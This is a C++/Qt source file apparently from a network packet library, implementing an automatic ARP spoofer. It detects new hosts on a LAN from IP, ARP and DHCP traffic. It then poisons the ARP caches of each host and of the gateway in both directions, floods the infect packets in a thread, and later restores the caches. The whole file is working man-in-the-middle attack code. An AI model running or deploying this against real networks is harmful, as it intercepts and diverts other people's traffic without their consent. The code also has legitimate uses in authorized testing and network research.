#include "gautoarpspoof.h"
#include "net/pdu/gdhcphdr.h"

// ----------------------------------------------------------------------------
// GAutoArpSpoof
// ----------------------------------------------------------------------------
GAutoArpSpoof::GAutoArpSpoof(QObject* parent) : GArpSpoof(parent) {
}

GAutoArpSpoof::~GAutoArpSpoof() {
	close();
}

bool GAutoArpSpoof::doOpen() {
	if (!enabled_) return true;

	if (checkIp_ == false && checkArp_ == false && checkDhcp_ == false) {
		SET_ERR(GErr::FAIL, "all checking ip, arp, dhcp are false");
		return false;
	}

	if (!GArpSpoof::doOpen()) return false;

	Q_ASSERT(intf_ != nullptr);
	myMac_ = intf_->mac();
	myIp_ = intf_->ip();
	gwIp_ = intf_->gateway();

	GAtm::iterator it = atm_.find(gwIp_);
	if (it == atm_.end()) {
		atm_.insert(gwIp_, GMac::nullMac());
		atm_.intfName_ = intfName_;
		if (!atm_.open()) {
			err = atm_.err;
			atm_.close();
			return false;
		}
		bool res = atm_.wait();
		atm_.close();
		if (!res) {
			SET_ERR(GErr::FAIL, QString("can not find mac for %1").arg(QString(gwIp_)));
			return false;
		}
		it = atm_.find(gwIp_);
		Q_ASSERT(it != atm_.end());
	}
	gwMac_ = it.value();

	return true;
}

bool GAutoArpSpoof::doClose() {
	if (!enabled_) return true;

	{
		QMutexLocker ml(&floodingThreadSet_.m_);
		for (FloodingThread* thread: floodingThreadSet_) {
			thread->we_.wakeAll();
		}
	}

	{
		QMutexLocker ml(&recoverThreadSet_.m_);
		for (RecoverThread* thread: recoverThreadSet_) {
			thread->we_.wakeAll();
		}
	}


	QElapsedTimer timer;
	quint64 start = timer.elapsed();
	while (true) {
		{
			QMutexLocker ml(&floodingThreadSet_.m_);
			qDebug() << floodingThreadSet_.count();  // gilgil temp 2021.11.05
			if (floodingThreadSet_.count() == 0) break;
		}
		QCoreApplication::processEvents();
		QThread::msleep(10);
		quint64 now = timer.elapsed();
		if (now - start > G::Timeout) {
			int count = floodingThreadSet_.count();
			qCritical() << QString("floodingThreadSet_.count() is %1").arg(count);
			break;
		}
	}

	start = timer.elapsed();
	while (true) {
		{
			QMutexLocker ml(&recoverThreadSet_.m_);
			qDebug() << recoverThreadSet_.count(); // gilgil temp 2021.11.05
			if (recoverThreadSet_.count() == 0) break;
		}
		QCoreApplication::processEvents();
		QThread::msleep(10);
		quint64 now = timer.elapsed();
		if (now - start > G::Timeout) {
			int count = recoverThreadSet_.count();
			qCritical() << QString("recoverThreadSet_.count() is %1").arg(count);
			break;
		}
	}

	return GArpSpoof::doClose();
}

void GAutoArpSpoof::processPacket(GPacket* packet) {
	GMac mac;
	GIp ip;

	bool attack = false;
	if (checkIp_ && processIp(packet, &mac, &ip))
		attack = true;
	if (checkArp_ && processArp(packet, &mac, &ip))
		attack = true;
	if (checkDhcp_ && processDhcp(packet, &mac, &ip))
		attack = true;
	if (!attack) return;

	if (ip.isNull() || mac.isNull()) return;
	if (ip == myIp_ || ip == gwIp_) return;
	if (mac == myMac_ || mac == gwMac_) return;

	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
	{
		QMutexLocker ml(&flowMap_.m_);
		if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
	}
	qDebug() << QString("new host(%1 %2) detected").arg(QString(mac), QString(ip));

	Flow flow(ip, mac, gwIp_, gwMac_);
	flow.makePacket(&flow.infectPacket_, myMac_, true);
	flow.makePacket(&flow.recoverPacket_, myMac_, false);

	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
	Flow revFlow(gwIp_, gwMac_, ip, mac);
	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);

	{
		QMutexLocker ml(&flowList_.m_);
		flowList_.push_back(flow);
		flowList_.push_back(revFlow);
	}
	{
		QMutexLocker mlForMap(&flowMap_.m_);
		flowMap_.insert(ipFlowKey, flow);
		flowMap_.insert(revIpFlowKey, revFlow);
	}

	sendArpInfect(&flow, GArpHdr::Request);
	QThread::msleep(sendInterval_);
	sendArpInfect(&revFlow, GArpHdr::Request);

	if (floodingTimeout_ != 0) {
		QMetaObject::invokeMethod(this, [this, flow, revFlow]() {
			FloodingThread* thread = new FloodingThread(this, flow.infectPacket_, revFlow.infectPacket_);
			QObject::connect(thread, &QThread::finished, thread, &QObject::deleteLater);
			thread->start();
		});
	}

	if (recoverTimeout_ != 0) {
		QMetaObject::invokeMethod(this, [this, flow, revFlow]() {
			RecoverThread* thread = new RecoverThread(this, flow, revFlow);
			QObject::connect(thread, &QThread::finished, thread, &QObject::deleteLater);
			thread->start();
		});
	}
}

bool GAutoArpSpoof::processIp(GPacket* packet, GMac* mac, GIp* ip) {
	GEthHdr* ethHdr = packet->ethHdr_;
	if (ethHdr == nullptr) return false;

	GIpHdr* ipHdr = packet->ipHdr_;
	if (ipHdr == nullptr) return false;

	*mac = ethHdr->smac();
	*ip = ipHdr->sip();
	return true;
}

bool GAutoArpSpoof::processArp(GPacket* packet, GMac* mac, GIp* ip) {
	GArpHdr* arpHdr = packet->arpHdr_;
	if (arpHdr == nullptr) return false;

	*mac = arpHdr->smac();
	*ip = arpHdr->sip();
	return true;
}

bool GAutoArpSpoof::processDhcp(GPacket* packet, GMac* mac, GIp* ip) {
	GUdpHdr* udpHdr = packet->udpHdr_;
	if (udpHdr == nullptr) return false;

	if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;

	GBuf dhcp = packet->udpData_;
	if (dhcp.data_ == nullptr) return false;
	if (dhcp.size_ < sizeof(GDhcpHdr)) return false;
	GDhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);

	if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
		*mac = dhcpHdr->clientMac();
		*ip = dhcpHdr->yourIp();
		return true;
	}

	GEthHdr* ethHdr = packet->ethHdr_;
	if (ethHdr == nullptr) return false;
	gbyte* end = packet->buf_.data_ + packet->buf_.size_;
	GDhcpHdr::Option* option = dhcpHdr->first();
	while (true) {
		if (option->type_ == GDhcpHdr::RequestedIpAddress) {
			*ip = ntohl(*PIp(option->value()));
			*mac = ethHdr->smac();
			return true;
		}
		option = option->next();
		if (option == nullptr) break;
		if (pbyte(option) >= end) break;
	}
	return false;
}

GAutoArpSpoof::FloodingThread::FloodingThread(GAutoArpSpoof* parent, GEthArpHdr infectPacket1, GEthArpHdr infectPacket2) : QThread(parent) {
	GDEBUG_CTOR
	parent_ = parent;
	infectPacket_[0] = infectPacket1;
	infectPacket_[1] = infectPacket2;
	{
		QMutexLocker ml(&parent_->floodingThreadSet_.m_);
		parent_->floodingThreadSet_.insert(this);
	}
}

GAutoArpSpoof::FloodingThread::~FloodingThread() {
	GDEBUG_DTOR
	{
		QMutexLocker ml(&parent_->floodingThreadSet_.m_);
		parent_->floodingThreadSet_.remove(this);
	}
}

void GAutoArpSpoof::FloodingThread::run() {
	qDebug() << "beg";
	QElapsedTimer timer;
	timer.start();
	while (parent_->active()) {
		qint64 elapsed = timer.elapsed();
		if (elapsed > qint64(parent_->floodingTimeout_)) break;
		for (int i = 0; i < 2; i++) {
			GBuf buf(pbyte(&infectPacket_[i]), sizeof(GEthArpHdr));
			parent_->write(buf);
			if (we_.wait(parent_->sendInterval_)) break;
		}
		if (we_.wait(parent_->floodingSendInterval_)) break;
	}
	qDebug() << "end";
}

GAutoArpSpoof::RecoverThread::RecoverThread(GAutoArpSpoof* parent, Flow flow1, Flow flow2) : QThread(parent) {
	GDEBUG_CTOR
	parent_ = parent;
	flow1_ = flow1;
	flow2_ = flow2;
	{
		QMutexLocker ml(&parent_->recoverThreadSet_.m_);
		parent_->recoverThreadSet_.insert(this);
	}
}

GAutoArpSpoof::RecoverThread::~RecoverThread() {
	GDEBUG_DTOR
	{
		QMutexLocker ml(&parent_->recoverThreadSet_.m_);
		parent_->recoverThreadSet_.remove(this);

		if (parent_->active()) {
			parent_->removeFlows(&flow1_, &flow2_);
		}
	}
}

void GAutoArpSpoof::RecoverThread::run() {
	qDebug() << "beg";
	if (we_.wait(parent_->recoverTimeout_)) return;
	qDebug() << "end";
}

void GAutoArpSpoof::removeFlows(Flow* flow1, Flow* flow2) {
	sendArpRecover(flow1, GArpHdr::Request);
	QThread::msleep(sendInterval_);
	sendArpInfect(flow2, GArpHdr::Request);

	FlowList flowList;
	flowList.push_back(*flow1);
	flowList.push_back(*flow2);
	runArpRecover(&flowList);

	GFlow::IpFlowKey flow1Key(flow1->senderIp_, flow1->targetIp_);
	GFlow::IpFlowKey flow2Key(flow2->senderIp_, flow2->targetIp_);
	{
		QMutexLocker ml(&flowList_.m_);
		int index = flowList_.findIndex(flow1Key);
		if (index != -1)
			flowList_.removeAt(index);

		index = flowList_.findIndex(flow2Key);
		if (index != -1)
			flowList_.removeAt(index);
	}
	{
		QMutexLocker mlForMap(&flowMap_.m_);
		flowMap_.remove(flow1Key);
		flowMap_.remove(flow2Key);
	}
}
